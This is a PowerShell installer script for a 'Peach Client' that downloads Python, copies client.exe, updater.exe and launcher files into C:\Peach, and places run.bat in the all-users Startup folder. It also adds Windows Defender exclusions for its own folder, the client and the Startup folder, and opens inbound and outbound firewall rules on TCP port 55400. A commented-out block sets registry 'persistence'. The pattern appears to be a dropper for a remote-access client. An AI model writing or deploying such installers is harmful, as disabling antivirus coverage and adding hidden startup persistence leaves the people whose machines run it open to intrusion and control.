# Destination path
$dst_path = 'C:\Peach\client.exe'

# Windows startup folder for all users
$startup_path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# Python version
$python_version = "3.10.8"

Write-Host "Installing Peach Client..."

# Install python
# Check if file exists
$url = "https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe"
$outpath = "$PSScriptRoot/python-3.10.8.exe"

if (-not(Test-Path -Path $outpath -PathType Leaf)) {
    try {
        Write-Host "Downloading Python $python_version..."
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $outpath)
    
    }
    catch {
        throw $_.Exception.Message
    }
}
            
Write-Host "Installing python $python_version..."
.\python-3.10.8.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

# Create local folder
Write-Host "Creating Dir Peach..."
New-Item -ItemType Directory -Force -Path "C:\Peach"

# Copy client to folder
Write-Host "Copying client.exe to c:\peach\... "
Copy-Item -Path "$PSScriptRoot\client.exe" "c:\Peach\client.exe" -Force
Write-Host "Copying peach.png to c:\peach\... " 
Copy-Item -Path "$PSScriptRoot\peach.png" "c:\Peach" -Force 
Write-Host "Copying run.vbs to c:\peach\... "
Copy-Item -Path "$PSScriptRoot\run.vbs" "c:\Peach" -Force 
Write-Host "Copying updater.exe to c:\peach\... "
Copy-Item -Path "$PSScriptRoot\updater.exe" "c:\Peach" -Force 
Write-Host "Copying run.bat to startup folder... "
Copy-Item -Path "$PSScriptRoot\run.bat" "$startup_path" -Force

# Create Defender Exclusion for EXE File
Write-Host "Creating an Exclusion for Windows Defender..."
Add-MpPreference -ExclusionPath "$PSScriptRoot"
Add-MpPreference -ExclusionPath "$dst_path"
Add-MpPreference -ExclusionPath "$startup_path"

# Print Out Defender's Exclusion List
Get-MpPreference | Select-Object -Property ExclusionPath
Write-Host "Done!"

# Set Autorun in Registry
# Write-Host "Setting up persistence..."
# $persistence = Set-Itemproperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Peach' -Value 'c:\Peach\run.bat' -Force
# Write-Host "Done."

# Open Port 55400 For Incoming & Outgoing Traffic
Write-Host "Opening Port 55400..."
New-NetFirewallRule -DisplayName "Allow Incoming Port 55400 For Peach" -Direction Inbound -Profile Any -Action Allow -LocalPort 55400 -Protocol TCP
New-NetFirewallRule -DisplayName "Allow Outgoing Port 55400 For Peach" -Direction Outbound -Profile Any -Action Allow -LocalPort 55400 -Protocol TCP
Write-Host "Done!"

Write-Host "Installation completed, cleaning up..."
Remove-Item $outpath

# Run client
wscript "c:\Peach\run.vbs"